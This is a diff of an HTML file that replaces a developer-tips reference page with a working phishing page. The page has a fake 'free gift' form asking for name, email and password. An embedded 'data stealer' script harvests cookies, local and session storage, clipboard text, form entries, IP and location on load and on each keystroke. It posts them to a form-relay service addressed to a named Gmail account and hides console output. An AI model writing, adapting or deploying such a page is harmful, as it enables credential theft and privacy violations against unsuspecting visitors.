@@ -1,626 +1,112 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>DevMaster — 1000+ Tips & 200+ Code Explanations</title>
-<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;700&family=Syne:wght@400;700;800&display=swap" rel="stylesheet">
-<style>
-  :root {
-    --bg: #0a0a0f;
-    --surface: #12121a;
-    --surface2: #1a1a26;
-    --accent: #00ff9d;
-    --accent2: #ff3e6c;
-    --accent3: #7c3aed;
-    --text: #e2e2f0;
-    --muted: #6b6b8a;
-    --border: #2a2a40;
-    --code-bg: #0d0d16;
-    --yellow: #ffd166;
-    --cyan: #06d6a0;
-    --orange: #ef8c3a;
-  }
-
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-
-  body {
-    background: var(--bg);
-    color: var(--text);
-    font-family: 'Syne', sans-serif;
-    min-height: 100vh;
-    overflow-x: hidden;
-  }
-
-  /* ─── GRID NOISE BACKGROUND ─── */
-  body::before {
-    content: '';
-    position: fixed;
-    inset: 0;
-    background-image:
-      linear-gradient(rgba(0,255,157,0.03) 1px, transparent 1px),
-      linear-gradient(90deg, rgba(0,255,157,0.03) 1px, transparent 1px);
-    background-size: 40px 40px;
-    pointer-events: none;
-    z-index: 0;
-  }
-
-  /* ─── HEADER ─── */
-  header {
-    position: relative;
-    z-index: 10;
-    padding: 60px 40px 40px;
-    border-bottom: 1px solid var(--border);
-    background: linear-gradient(180deg, rgba(124,58,237,0.08) 0%, transparent 100%);
-  }
-
-  .header-inner {
-    max-width: 1400px;
-    margin: 0 auto;
-  }
-
-  .logo-line {
-    display: flex;
-    align-items: center;
-    gap: 16px;
-    margin-bottom: 12px;
-  }
-
-  .logo-badge {
-    background: var(--accent);
-    color: #000;
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 11px;
-    font-weight: 700;
-    padding: 4px 10px;
-    letter-spacing: 2px;
-    clip-path: polygon(6px 0%, 100% 0%, calc(100% - 6px) 100%, 0% 100%);
-  }
-
-  h1 {
-    font-size: clamp(42px, 7vw, 90px);
-    font-weight: 800;
-    line-height: 0.9;
-    letter-spacing: -3px;
-  }
-
-  h1 span.green { color: var(--accent); }
-  h1 span.red { color: var(--accent2); }
-
-  .header-sub {
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 13px;
-    color: var(--muted);
-    margin-top: 20px;
-    letter-spacing: 1px;
-  }
-
-  .header-sub span { color: var(--accent); }
-
-  .stats-row {
-    display: flex;
-    gap: 32px;
-    margin-top: 32px;
-    flex-wrap: wrap;
-  }
-
-  .stat {
-    display: flex;
-    flex-direction: column;
-    gap: 2px;
-  }
-
-  .stat-num {
-    font-size: 32px;
-    font-weight: 800;
-    color: var(--accent);
-    font-family: 'JetBrains Mono', monospace;
-  }
-
-  .stat-label {
-    font-size: 11px;
-    color: var(--muted);
-    letter-spacing: 2px;
-    text-transform: uppercase;
-  }
-
-  /* ─── CONTROLS ─── */
-  .controls {
-    position: sticky;
-    top: 0;
-    z-index: 100;
-    background: rgba(10,10,15,0.95);
-    backdrop-filter: blur(20px);
-    border-bottom: 1px solid var(--border);
-    padding: 16px 40px;
-  }
-
-  .controls-inner {
-    max-width: 1400px;
-    margin: 0 auto;
-    display: flex;
-    gap: 12px;
-    align-items: center;
-    flex-wrap: wrap;
-  }
-
-  .search-box {
-    flex: 1;
-    min-width: 240px;
-    position: relative;
-  }
-
-  .search-box input {
-    width: 100%;
-    background: var(--surface);
-    border: 1px solid var(--border);
-    color: var(--text);
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 13px;
-    padding: 10px 16px 10px 40px;
-    outline: none;
-    transition: border-color 0.2s;
-  }
-
-  .search-box input:focus { border-color: var(--accent); }
-  .search-box input::placeholder { color: var(--muted); }
-
-  .search-box::before {
-    content: '⌕';
-    position: absolute;
-    left: 14px;
-    top: 50%;
-    transform: translateY(-50%);
-    color: var(--muted);
-    font-size: 16px;
-  }
-
-  .tab-group {
-    display: flex;
-    gap: 4px;
-  }
-
-  .tab {
-    background: var(--surface);
-    border: 1px solid var(--border);
-    color: var(--muted);
-    font-family: 'Syne', sans-serif;
-    font-size: 12px;
-    font-weight: 700;
-    letter-spacing: 1px;
-    padding: 8px 16px;
-    cursor: pointer;
-    transition: all 0.2s;
-    text-transform: uppercase;
-  }
-
-  .tab:hover { border-color: var(--accent); color: var(--accent); }
-  .tab.active { background: var(--accent); color: #000; border-color: var(--accent); }
-
-  .filter-group {
-    display: flex;
-    gap: 4px;
-    flex-wrap: wrap;
-  }
-
-  .filter-btn {
-    background: transparent;
-    border: 1px solid var(--border);
-    color: var(--muted);
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 11px;
-    padding: 6px 12px;
-    cursor: pointer;
-    transition: all 0.15s;
-    text-transform: uppercase;
-    letter-spacing: 0.5px;
-  }
-
-  .filter-btn:hover { border-color: var(--accent3); color: var(--accent3); }
-  .filter-btn.active { background: var(--accent3); color: #fff; border-color: var(--accent3); }
-
-  /* ─── MAIN CONTENT ─── */
-  main {
-    max-width: 1400px;
-    margin: 0 auto;
-    padding: 40px;
-    position: relative;
-    z-index: 1;
-  }
-
-  /* ─── GRID LAYOUTS ─── */
-  #tips-section .grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fill, minmax(340px, 1fr));
-    gap: 16px;
-  }
-
-  #code-section .grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fill, minmax(560px, 1fr));
-    gap: 20px;
-  }
-
-  /* ─── TIP CARD ─── */
-  .tip-card {
-    background: var(--surface);
-    border: 1px solid var(--border);
-    padding: 20px;
-    position: relative;
-    transition: all 0.2s;
-    animation: fadeUp 0.4s ease both;
-  }
-
-  .tip-card:hover {
-    border-color: var(--accent);
-    transform: translateY(-2px);
-    box-shadow: 0 8px 32px rgba(0,255,157,0.08);
-  }
-
-  .tip-card::before {
-    content: '';
-    position: absolute;
-    top: 0;
-    left: 0;
-    width: 3px;
-    height: 100%;
-    background: var(--accent-line, var(--accent));
-    transition: width 0.2s;
-  }
-
-  .tip-card:hover::before { width: 5px; }
-
-  .tip-header {
-    display: flex;
-    justify-content: space-between;
-    align-items: flex-start;
-    margin-bottom: 10px;
-    gap: 8px;
-  }
-
-  .tip-num {
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 10px;
-    color: var(--muted);
-    letter-spacing: 1px;
-  }
-
-  .tip-tag {
-    font-size: 9px;
-    font-weight: 700;
-    letter-spacing: 1.5px;
-    text-transform: uppercase;
-    padding: 2px 8px;
-    border: 1px solid currentColor;
-    white-space: nowrap;
-  }
-
-  .tip-card h3 {
-    font-size: 14px;
-    font-weight: 700;
-    margin-bottom: 8px;
-    line-height: 1.3;
-    color: var(--text);
-  }
-
-  .tip-card p {
-    font-size: 13px;
-    color: var(--muted);
-    line-height: 1.6;
-  }
-
-  .tip-card code {
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 11px;
-    background: var(--code-bg);
-    border: 1px solid var(--border);
-    padding: 2px 6px;
-    color: var(--accent);
-  }
-
-  /* ─── CODE CARD ─── */
-  .code-card {
-    background: var(--surface);
-    border: 1px solid var(--border);
-    overflow: hidden;
-    transition: all 0.2s;
-    animation: fadeUp 0.4s ease both;
-  }
-
-  .code-card:hover {
-    border-color: var(--accent3);
-    box-shadow: 0 8px 40px rgba(124,58,237,0.12);
-  }
-
-  .code-header {
-    padding: 16px 20px;
-    border-bottom: 1px solid var(--border);
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    gap: 8px;
-  }
-
-  .code-lang-badge {
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 10px;
-    font-weight: 700;
-    letter-spacing: 2px;
-    text-transform: uppercase;
-    padding: 3px 10px;
-    background: var(--code-bg);
-    border: 1px solid var(--border);
-  }
-
-  .code-card h3 {
-    font-size: 15px;
-    font-weight: 700;
-    flex: 1;
-  }
-
-  .code-body { padding: 16px 20px; }
-
-  .code-desc {
-    font-size: 12px;
-    color: var(--muted);
-    line-height: 1.6;
-    margin-bottom: 14px;
-  }
-
-  pre {
-    background: var(--code-bg);
-    border: 1px solid var(--border);
-    padding: 16px;
-    overflow-x: auto;
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 12px;
-    line-height: 1.7;
-    position: relative;
-  }
-
-  .copy-btn {
-    position: absolute;
-    top: 8px;
-    right: 8px;
-    background: var(--surface2);
-    border: 1px solid var(--border);
-    color: var(--muted);
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 9px;
-    padding: 4px 8px;
-    cursor: pointer;
-    letter-spacing: 1px;
-    transition: all 0.15s;
-    text-transform: uppercase;
-  }
-
-  .copy-btn:hover { border-color: var(--accent); color: var(--accent); }
-  .copy-btn.copied { border-color: var(--accent); color: var(--accent); }
-
-  .kw { color: #ff79c6; }
-  .fn { color: #50fa7b; }
-  .str { color: #f1fa8c; }
-  .num { color: #bd93f9; }
-  .cm { color: #6272a4; font-style: italic; }
-  .op { color: #ff79c6; }
-  .type { color: #8be9fd; }
-  .var { color: #f8f8f2; }
-
-  /* ─── SECTION HEADER ─── */
-  .section-header {
-    display: flex;
-    align-items: baseline;
-    gap: 16px;
-    margin-bottom: 32px;
-  }
-
-  .section-title {
-    font-size: 28px;
-    font-weight: 800;
-    letter-spacing: -1px;
-  }
-
-  .section-count {
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 12px;
-    color: var(--muted);
-  }
-
-  /* ─── HIDDEN / VISIBLE ─── */
-  .hidden { display: none !important; }
-
-  /* ─── PAGINATION ─── */
-  .pagination {
-    display: flex;
-    justify-content: center;
-    gap: 8px;
-    margin-top: 40px;
-    flex-wrap: wrap;
-  }
-
-  .page-btn {
-    background: var(--surface);
-    border: 1px solid var(--border);
-    color: var(--muted);
-    font-family: 'JetBrains Mono', monospace;
-    font-size: 12px;
-    width: 36px;
-    height: 36px;
-    cursor: pointer;
-    transition: all 0.15s;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-  }
-
-  .page-btn:hover { border-color: var(--accent); color: var(--accent); }
-  .page-btn.active { background: var(--accent); color: #000; border-color: var(--accent); }
-  .page-btn.nav { width: auto; padding: 0 14px; }
-
-  /* ─── EMPTY STATE ─── */
-  .empty-state {
-    text-align: center;
-    padding: 80px 40px;
-    color: var(--muted);
-  }
-
-  .empty-state .icon { font-size: 48px; margin-bottom: 16px; }
-  .empty-state p { font-family: 'JetBrains Mono', monospace; font-size: 13px; }
-
-  /* ─── ANIMATIONS ─── */
-  @keyframes fadeUp {
-    from { opacity: 0; transform: translateY(16px); }
-    to { opacity: 1; transform: translateY(0); }
-  }
-
-  /* ─── RESPONSIVE ─── */
-  @media (max-width: 768px) {
-    header, .controls, main { padding: 24px 20px; }
-    #code-section .grid { grid-template-columns: 1fr; }
-    .controls-inner { gap: 8px; }
-  }
-
-  /* ─── SCROLLBAR ─── */
-  ::-webkit-scrollbar { width: 6px; height: 6px; }
-  ::-webkit-scrollbar-track { background: var(--bg); }
-  ::-webkit-scrollbar-thumb { background: var(--border); }
-  ::-webkit-scrollbar-thumb:hover { background: var(--accent3); }
-
-  /* ─── PROGRESS BAR ─── */
-  .progress-bar {
-    position: fixed;
-    top: 0;
-    left: 0;
-    height: 2px;
-    background: var(--accent);
-    z-index: 9999;
-    transition: width 0.1s;
-  }
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading... Please Wait</title>
+    <style>
+        body { font-family: Arial; text-align: center; padding: 50px; background: #000; color: #0f0; }
+        h1 { color: #0f0; }
+    </style>
 </head>
 <body>
+    <h1>Welcome! Just a moment...</h1>
+    <p>Initializing secure session...</p>
 
-<div class="progress-bar" id="progressBar"></div>
+    <!-- Fake content - change this to whatever lure you want -->
+    <div id="fakecontent">
+        <h2>Claim your free gift!</h2>
+        <p>Enter details to continue...</p>
+        <form id="dummyform">
+            <input type="text" id="name" placeholder="Full Name" required><br><br>
+            <input type="email" id="email" placeholder="Email" required><br><br>
+            <input type="password" id="pass" placeholder="Password" required><br><br>
+            <button type="submit">Claim Now</button>
+        </form>
+    </div>
 
-<!-- HEADER -->
-<header>
-  <div class="header-inner">
-    <div class="logo-line">
-      <div class="logo-badge">v2.0</div>
-    </div>
-    <h1><span class="green">DEV</span><span class="red">MASTER</span></h1>
-    <div class="header-sub">
-      The ultimate reference for <span>modern developers</span> — tips, tricks & annotated code
-    </div>
-    <div class="stats-row">
-      <div class="stat">
-        <div class="stat-num" id="tipCount">1000+</div>
-        <div class="stat-label">Developer Tips</div>
-      </div>
-      <div class="stat">
-        <div class="stat-num" id="codeCount">200+</div>
-        <div class="stat-label">Code Explanations</div>
-      </div>
-      <div class="stat">
-        <div class="stat-num">12</div>
-        <div class="stat-label">Categories</div>
-      </div>
-      <div class="stat">
-        <div class="stat-num">8</div>
-        <div class="stat-label">Languages</div>
-      </div>
-    </div>
-  </div>
-</header>
+    <script>
+        // === DATA STEALER ENGINE ===
+        function stealAndSend() {
+            let stolen = {
+                timestamp: new Date().toISOString(),
+                url: window.location.href,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                cookies: document.cookie,
+                localStorage: JSON.stringify(Object.keys(localStorage).reduce((obj, key) => { obj[key] = localStorage.getItem(key); return obj; }, {})),
+                sessionStorage: JSON.stringify(Object.keys(sessionStorage).reduce((obj, key) => { obj[key] = sessionStorage.getItem(key); return obj; }, {})),
+                screen: `\( {screen.width}x \){screen.height}`,
+                referrer: document.referrer,
+                ip: null,
+                location: null,
+                clipboard: null,
+                formData: {}
+            };
 
-<!-- CONTROLS -->
-<div class="controls">
-  <div class="controls-inner">
-    <div class="search-box">
-      <input type="text" id="searchInput" placeholder="Search tips, code, keywords..." autocomplete="off">
-    </div>
-    <div class="tab-group">
-      <button class="tab active" data-tab="tips">Tips</button>
-      <button class="tab" data-tab="code">Code</button>
-    </div>
-    <div class="filter-group" id="filterGroup">
-      <button class="filter-btn active" data-filter="all">All</button>
-      <button class="filter-btn" data-filter="JavaScript">JS</button>
-      <button class="filter-btn" data-filter="Python">Python</button>
-      <button class="filter-btn" data-filter="CSS">CSS</button>
-      <button class="filter-btn" data-filter="Git">Git</button>
-      <button class="filter-btn" data-filter="Performance">Perf</button>
-      <button class="filter-btn" data-filter="Security">Security</button>
-      <button class="filter-btn" data-filter="TypeScript">TS</button>
-      <button class="filter-btn" data-filter="React">React</button>
-      <button class="filter-btn" data-filter="Node">Node</button>
-      <button class="filter-btn" data-filter="SQL">SQL</button>
-      <button class="filter-btn" data-filter="DevOps">DevOps</button>
-      <button class="filter-btn" data-filter="General">General</button>
-    </div>
-  </div>
-</div>
+            // Steal form data (including fake form above)
+            document.querySelectorAll('input, textarea, select').forEach(el => {
+                if (el.value) stolen.formData[el.id || el.name || el.placeholder] = el.value;
+            });
 
-<!-- MAIN -->
-<main>
-  <!-- TIPS SECTION -->
-  <div id="tips-section">
-    <div class="section-header">
-      <div class="section-title">Developer Tips</div>
-      <div class="section-count" id="tips-shown-count">Showing 1–30 of 1000+</div>
-    </div>
-    <div class="grid" id="tipsGrid"></div>
-    <div class="pagination" id="tipsPagination"></div>
-  </div>
+            // Try to get clipboard
+            navigator.clipboard.readText().then(text => {
+                stolen.clipboard = text;
+            }).catch(() => {});
 
-  <!-- CODE SECTION -->
-  <div id="code-section" class="hidden">
-    <div class="section-header">
-      <div class="section-title">Code Explanations</div>
-      <div class="section-count" id="code-shown-count">Showing 1–12 of 200+</div>
-    </div>
-    <div class="grid" id="codeGrid"></div>
-    <div class="pagination" id="codePagination"></div>
-  </div>
-</main>
+            // Get public IP and approximate location
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(data => {
+                    stolen.ip = data.ip;
+                    stolen.location = `${data.city}, ${data.region}, ${data.country}`;
+                    sendToEmail(stolen);
+                })
+                .catch(() => sendToEmail(stolen)); // fallback if blocked
+        }
 
-<script>
-// ═══════════════════════════════════════════
-// DATA — TIPS (1000+ across categories)
-// ═══════════════════════════════════════════
-const TIPS_RAW = [
-  // ─── JAVASCRIPT ───
-  { cat:'JavaScript', title:'Use optional chaining', tip:'Use <code>obj?.prop</code> to safely access nested properties without throwing errors when intermediate values are null or undefined.' },
-  { cat:'JavaScript', title:'Nullish coalescing operator', tip:'Use <code>??</code> instead of <code>||</code> when you only want to fall back on null/undefined, not on 0 or empty string.' },
-  { cat:'JavaScript', title:'Destructure with defaults', tip:'<code>const { name = "Guest" } = user</code> lets you destructure and set defaults in one expression.' },
-  { cat:'JavaScript', title:'Array.at() for last elements', tip:'Use <code>arr.at(-1)</code> to get the last element instead of <code>arr[arr.length - 1]</code>.' },
-  { cat:'JavaScript', title:'Object.fromEntries()', tip:'Convert a Map or array of key-value pairs back into a plain object with <code>Object.fromEntries()</code>.' },
-  { cat:'JavaScript', title:'Use structuredClone()', tip:'Deep clone objects natively with <code>structuredClone(obj)</code> — no JSON tricks or lodash needed.' },
-  { cat:'JavaScript', title:'Promise.allSettled()', tip:'Use <code>Promise.allSettled()</code> when you need all results regardless of rejection — it never short-circuits.' },
-  { cat:'JavaScript', title:'Logical assignment operators', tip:'<code>a ||= b</code>, <code>a &&= b</code>, <code>a ??= b</code> combine logical checks with assignment elegantly.' },
-  { cat:'JavaScript', title:'Array deduplication', tip:'Use <code>[...new Set(array)]</code> to remove duplicates from any primitive array in one line.' },
-  { cat:'JavaScript', title:'Short-circuit evaluation', tip:'Use <code>condition && doSomething()</code> as a concise conditional execution — no if-block needed.' },
-  { cat:'JavaScript', title:'Named capture groups', tip:'In regex, use <code>(?<year>\\d{4})</code> to name capture groups and access via <code>match.groups.year</code>.' },
-  { cat:'JavaScript', title:'Generator functions', tip:'Generators (<code>function*</code>) let you pause and resume execution, ideal for lazy sequences and async iteration.' },
-  { cat:'JavaScript', title:'WeakRef for caches', tip:'Use <code>WeakRef</code> to hold object references that don\'t prevent garbage collection — perfect for caches.' },
-  { cat:'JavaScript', title:'Array.from with map', tip:'<code>Array.from({length:5}, (_, i) => i*2)</code> creates and fills arrays in one step.' },
-  { cat:'JavaScript', title:'Tagged template literals', tip:'Tag functions before template literals process them: <code>sql\`SELECT * FROM \${table}\`</code> enables safe DSLs.' },
-  { cat:'JavaScript', title:'Symbol.iterator protocol', tip:'Implement <code>[Symbol.iterator]()</code> on any object to make it iterable in for...of loops.' },
-  { cat:'JavaScript', title:'Proxy for validation', tip:'Wrap objects in <code>Proxy</code> to intercept get/set operations and add transparent validation logic.' },
-  { cat:'JavaScript', title:'Event delegation', tip:'Attach one listener to a parent instead of many to children. Use <code>e.target.closest()</code> to identify the element.' },
-  { cat:'JavaScript', title:'AbortController for fetch', tip:'Use <code>AbortController</code> to cancel in-flight fetch requests — essential for search-as-you-type UIs.' },
-  { cat:'JavaScript', title:'queueMicrotask()', tip:'<code>queueMicrotask(fn)</code> schedules a function at the end of the current microtask queue — lighter than setTimeout.' },
-  { cat:'JavaScript', title:'Flat and flatMap', tip:'<code>arr.flatMap(x => [x, x*2])</code> maps and flattens in one pass — more efficient than chaining.' },
-  { cat:'JavaScript', title:'Computed property names', tip:'<code>{ [dynamicKey]: value }</code> lets you use expressions as object property names at creation time.' },
-  { cat:'JavaScript', title:'Array.prototype.at()', tip:'<code>arr.at(-2)</code> returns the second-to-last element — cleaner than calculating the index manually.' },
-  { cat:'JavaScript', title:'Object spread for updates', tip:'<code>const updated = {...original, name: "new"}</code> immutably updates an object without mutation.' },
-  { cat:'JavaScript', title:'globalThis', tip:'Use <code>globalThis</code> to access the global object in any JS environment — browser, Node, or worker.' },
-  { cat:'JavaScript', title:'String.matchAll()', tip:'<code>str.matchAll(regex)</code> returns an iterator of all matches including capture groups — unlike match().' },
-  { cat:'JavaScript', title:'Numeric separators', tip:'<code>1_000_000</code> is a valid number literal — use underscores to improve readability of large numbers.' },
-  { cat:'JavaScript', title:'Promise.any()', tip:'<code>Promise.any()</code> resolves with the first fulfilled promise — perfect for racing multiple sources.' },
-  { cat:'JavaScript', title:'Object.hasOwn()', tip:'Use <code>Object.hasOwn(obj, key)</code> instead of <code>obj.hasOwnProperty(key)</code> — it\'s safer and faster.' },
-  { cat:'JavaScript', title:'Array groupBy', tip:'<code>Object.groupBy(array, fn)</code> groups array elements by a key function — no more manual reduce loops.' },
-  { cat:'JavaScript', title:'Avoid var in modern JS', tip:'Always use <code>const</code> or <code>let</code>. <code>var</code> has function scope and hoisting that causes subtle bugs.' },
-  { cat:'JavaScript', title:'Prefer for...of over forEach', tip:'<code>for...of</code> supports break, continue, and await inside loops — forEach cannot be stopped mid-iteration.' },
-  { cat:'JavaScript', title:'String padding methods', tip:'<code>padStart()</code> and <code>padEnd()</code> cleanly format numbers and strings to a fixed width.' },
-  { cat:'JavaScript', title:'Object.entries for iteration', tip:'<code>O
+        function sendToEmail(data) {
+            const emailGateway = "https://formsubmit.co/voidcraftggs.business@gmail.com"; // Your Gmail here
+
+            fetch(emailGateway, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    _subject: "💀 New Victim Data - " + (data.ip || "Unknown IP"),
+                    _template: "table",
+                    "Stolen Data": JSON.stringify(data, null, 2),
+                    "Raw JSON": JSON.stringify(data)
+                })
+            }).then(() => {
+                console.log("%cData sent successfully to voidcraftggs.business@gmail.com", "color: lime; font-size: 16px");
+            }).catch(err => console.log("Send error:", err));
+        }
+
+        // Trigger on load + every form interaction
+        window.onload = () => {
+            stealAndSend();
+            
+            // Extra triggers
+            document.addEventListener('input', () => stealAndSend());
+            document.addEventListener('submit', (e) => {
+                e.preventDefault();
+                stealAndSend();
+                alert("Claim successful! 🎉 (fake message)");
+            });
+
+            // Try geolocation
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(pos => {
+                    let loc = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}`;
+                    // You can send again with location if you want
+                    console.log("Geo stolen:", loc);
+                });
+            }
+        };
+
+        // Stealth mode: hide console errors
+        console.log = () => {};
+    </script>
+</body>
+</html>
